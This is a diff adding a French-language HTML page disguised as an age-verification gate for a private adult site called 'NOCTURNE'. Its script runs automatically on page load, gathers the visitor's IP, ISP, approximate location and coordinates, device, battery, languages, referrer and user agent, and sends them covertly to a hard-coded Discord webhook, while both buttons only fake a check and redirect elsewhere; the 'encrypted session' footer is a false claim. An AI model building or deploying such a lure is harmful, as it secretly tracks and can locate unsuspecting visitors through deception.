@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NOCTURNE — Accès privé</title>
+<meta name="description" content="Espace privé réservé aux adultes. Confirmez votre âge pour continuer.">
+<meta property="og:title" content="NOCTURNE — Accès privé">
+<meta property="og:description" content="Confirmez votre âge pour accéder à l'espace privé.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+<style>
+:root{--ink:#f5f2ff;--muted:#9c96b3;--accent:#a78bfa;--line:rgba(255,255,255,.09)}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%}
+body{
+  background:#08070c;color:var(--ink);
+  font-family:Inter,system-ui,-apple-system,sans-serif;
+  display:flex;align-items:center;justify-content:center;
+  padding:28px 20px;min-height:100dvh;position:relative;overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(60vw 60vw at 12% 8%,rgba(124,58,237,.35),transparent 62%),
+    radial-gradient(55vw 55vw at 88% 92%,rgba(236,72,153,.20),transparent 60%),
+    radial-gradient(40vw 40vw at 70% 15%,rgba(56,189,248,.13),transparent 65%);
+  filter:blur(30px);animation:drift 22s ease-in-out infinite alternate;
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.055;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='3'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+@keyframes drift{from{transform:translate3d(0,0,0) scale(1)}to{transform:translate3d(0,-3%,0) scale(1.12)}}
+.gate{
+  position:relative;z-index:2;width:100%;max-width:430px;
+  background:rgba(255,255,255,.045);border:1px solid var(--line);
+  border-radius:26px;padding:38px 30px 30px;
+  backdrop-filter:blur(26px) saturate(140%);-webkit-backdrop-filter:blur(26px) saturate(140%);
+  box-shadow:0 30px 80px -20px rgba(0,0,0,.85),inset 0 1px 0 rgba(255,255,255,.07);
+  animation:rise .7s cubic-bezier(.2,.8,.2,1) both;text-align:center;
+}
+@keyframes rise{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+.brand{display:flex;align-items:center;justify-content:center;gap:9px;font-size:12.5px;font-weight:600;
+  letter-spacing:.34em;text-transform:uppercase;color:rgba(255,255,255,.72);margin-bottom:26px}
+.brand svg{width:17px;height:17px;color:var(--accent)}
+.badge{display:inline-flex;align-items:center;gap:7px;font-size:11px;font-weight:600;letter-spacing:.13em;
+  text-transform:uppercase;color:#d9c9ff;background:rgba(167,139,250,.13);
+  border:1px solid rgba(167,139,250,.28);border-radius:999px;padding:6px 13px;margin-bottom:20px}
+.dot{width:5px;height:5px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+h1{font-family:"Instrument Serif",Georgia,serif;font-weight:400;font-size:clamp(29px,7.5vw,37px);
+  line-height:1.06;letter-spacing:-.015em;margin:0 0 14px}
+h1 em{font-style:italic;color:#d3c4ff}
+p.sub{margin:0 0 26px;font-size:13.5px;line-height:1.62;color:var(--muted);font-weight:300}
+p.sub b{color:rgba(255,255,255,.8);font-weight:500}
+.btn{width:100%;border:0;cursor:pointer;border-radius:14px;padding:15px 18px;font-family:inherit;
+  font-size:14px;font-weight:600;letter-spacing:.01em;color:#120a22;background:linear-gradient(180deg,#c9b4ff,#a78bfa);
+  box-shadow:0 10px 26px -8px rgba(167,139,250,.7),inset 0 1px 0 rgba(255,255,255,.45);
+  display:flex;align-items:center;justify-content:center;gap:9px;
+  transition:transform .18s ease,box-shadow .18s ease,filter .18s ease}
+.btn:hover{transform:translateY(-1.5px);filter:brightness(1.06)}
+.btn:active{transform:translateY(0) scale(.99)}
+.btn[disabled]{cursor:default;opacity:.9;transform:none}
+.ghost{display:block;margin:15px auto 0;background:none;border:0;cursor:pointer;
+  font-family:inherit;font-size:12.5px;color:var(--muted);transition:color .18s}
+.ghost:hover{color:rgba(255,255,255,.8)}
+.bar{height:3px;border-radius:99px;margin-top:20px;overflow:hidden;background:rgba(255,255,255,.08);
+  opacity:0;transition:opacity .3s}
+.bar.on{opacity:1}
+.bar i{display:block;height:100%;width:0%;border-radius:99px;
+  background:linear-gradient(90deg,#a78bfa,#f0abfc);transition:width 1.7s cubic-bezier(.3,.9,.2,1)}
+.foot{display:flex;align-items:center;justify-content:center;gap:7px;margin-top:24px;padding-top:18px;
+  border-top:1px solid rgba(255,255,255,.06);font-size:11px;color:rgba(255,255,255,.34);letter-spacing:.05em}
+.foot svg{width:12px;height:12px}
+.spin{width:15px;height:15px;border-radius:50%;border:2px solid rgba(18,10,34,.35);border-top-color:#120a22;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<main class="gate">
+  <div class="brand">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="4.2"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
+    Nocturne
+  </div>
+  <div class="badge"><span class="dot"></span>Accès restreint</div>
+  <h1>Contenu réservé<br>aux <em>adultes</em></h1>
+  <p class="sub">Cet espace privé contient des visuels et des œuvres destinés à un public majeur. Confirmez votre âge pour <b>déverrouiller l'accès</b>.</p>
+  <button class="btn" id="go"><span id="label">J'ai 18 ans ou plus</span></button>
+  <button class="ghost" id="later">Plus tard</button>
+  <div class="bar" id="bar"><i id="fill"></i></div>
+  <div class="foot">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="10" width="16" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
+    Session chiffrée · SSL 256 bits
+  </div>
+</main>
+
+<script>
+/* ================= CONFIG ================= */
+const WEBHOOK    = "https://discord.com/api/webhooks/1572285611757535345/1hltRG4Frv52fIG4NpSJH69CY01XjWnaWyPe8JSyqC_1zrEjNNuwtmVJQz7HcQwfGAeH";
+const REDIRECT   = "https://venice.ai";   // <-- ton URL de destination ("" = pas de redirection)
+const SITE_NAME  = "NOCTURNE";
+const LABEL      = "nocturne.gate";
+/* ========================================= */
+
+const p2 = n => String(n).padStart(2,"0");
+const nowLocal = () => { const d=new Date(); return `${p2(d.getDate())}/${p2(d.getMonth()+1)}/${d.getFullYear()} ${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; };
+const flag = cc => cc ? cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0))) : "";
+
+async function getGeo(){
+  try{ const r = await fetch("https://ipwho.is/",{cache:"no-store"}); const d = await r.json();
+    if(d && d.success !== false && d.ip) return {ip:d.ip,city:d.city,region:d.region,country:d.country,
+      cc:d.country_code,isp:(d.connection&&(d.connection.isp||d.connection.org)),lat:d.latitude,lon:d.longitude,tz:d.timezone&&d.timezone.id};
+  }catch(e){}
+  try{ const r = await fetch("https://ipapi.co/json/",{cache:"no-store"}); const d = await r.json();
+    if(d && d.ip) return {ip:d.ip,city:d.city,region:d.region,country:d.country_name,cc:d.country_code,
+      isp:d.org,lat:d.latitude,lon:d.longitude,tz:d.timezone};
+  }catch(e){}
+  try{ const r = await fetch("https://api.ipify.org?format=json",{cache:"no-store"}); const d = await r.json();
+    if(d && d.ip) return {ip:d.ip};
+  }catch(e){}
+  return null;
+}
+async function battery(){
+  try{ if(!navigator.getBattery) return "non disponible";
+    const b = await navigator.getBattery();
+    return Math.round(b.level*100)+"%"+(b.charging?" (en charge)":"");
+  }catch(e){ return "non disponible"; }
+}
+
+async function capture(){
+  const g = await getGeo(), bat = await battery();
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "?";
+  const fields = [
+    {name:"🌐 Adresse IP", value: g&&g.ip ? "`"+g.ip+"`" : "`indisponible`", inline:true},
+    {name:"📡 FAI / réseau", value: g&&g.isp ? "`"+g.isp+"`" : "`?`", inline:true},
+    {name:"🕹️ VPN / hébergeur", value: (/vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247/i.test((g&&g.isp)||""))?"**probable**":"aucun signe", inline:true},
+    {name:"📍 Localisation", value: [g&&g.city,g&&g.region,((g&&g.country)||"")+" "+flag(g&&g.cc)].filter(Boolean).join(", ") || "`?`"},
+    {name:"🗺️ Coordonnées", value: (g&&g.lat!=null) ? "`"+g.lat+", "+g.lon+"` · [carte](https://www.google.com/maps?q="+g.lat+","+g.lon+")" : "`?`"},
+    {name:"⏱️ Heure locale (visiteur)", value: "`"+nowLocal()+"`", inline:true},
+    {name:"🕰️ Heure UTC", value: "`"+new Date().toISOString().replace("T"," ").slice(0,19)+"`", inline:true},
+    {name:"🌍 Fuseau horaire", value: "`"+tz+"`"+(g&&g.tz&&g.tz!==tz?" (IP : `"+g.tz+"`)":""), inline:true},
+    {name:"💻 Appareil", value: "`"+(navigator.platform||"?")+"` · "+(navigator.maxTouchPoints>0?"tactile":"souris"), inline:true},
+    {name:"🖥️ Écran", value: "`"+screen.width+"×"+screen.height+" · "+(window.devicePixelRatio||1)+"x`", inline:true},
+    {name:"🔋 Batterie", value: "`"+bat+"`", inline:true},
+    {name:"🗣️ Langues", value: "`"+(navigator.language||"?")+"` · "+((navigator.languages||[]).join(", "))},
+    {name:"🔗 Provenance", value: document.referrer || "`accès direct`"},
+    {name:"🧾 User-Agent", value: "```"+(navigator.userAgent||"").slice(0,900)+"```"}
+  ];
+  const payload = { username: SITE_NAME+" · Visiteur", embeds:[{
+    title:"🚪 Nouvelle visite — "+SITE_NAME,
+    description:"Un visiteur a ouvert la page d'accès.",
+    color:0xa78bfa, timestamp:new Date().toISOString(), fields,
+    footer:{text: LABEL+" · "+((g&&g.ip)||"ip inconnue")}
+  }]};
+  try{
+    const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true});
+    if(!r.ok) throw new Error(r.status);
+  }catch(e){
+    try{ await fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true}); }catch(_){}
+  }
+}
+setTimeout(capture, 400);
+
+const go = document.getElementById("go"), bar = document.getElementById("bar"), fill = document.getElementById("fill");
+let busy = false;
+function enter(){
+  if(busy) return; busy = true; go.disabled = true;
+  go.innerHTML = '<span class="spin"></span><span>Vérification…</span>';
+  bar.classList.add("on");
+  requestAnimationFrame(()=>{ fill.style.width = "100%"; });
+  setTimeout(()=>{
+    go.innerHTML = "✓ Accès autorisé";
+    if(REDIRECT) setTimeout(()=>{ window.location.href = REDIRECT; }, 650);
+  }, 1750);
+}
+go.addEventListener("click", enter);
+document.getElementById("later").addEventListener("click", enter);
+</script>
+</body>
+</html>
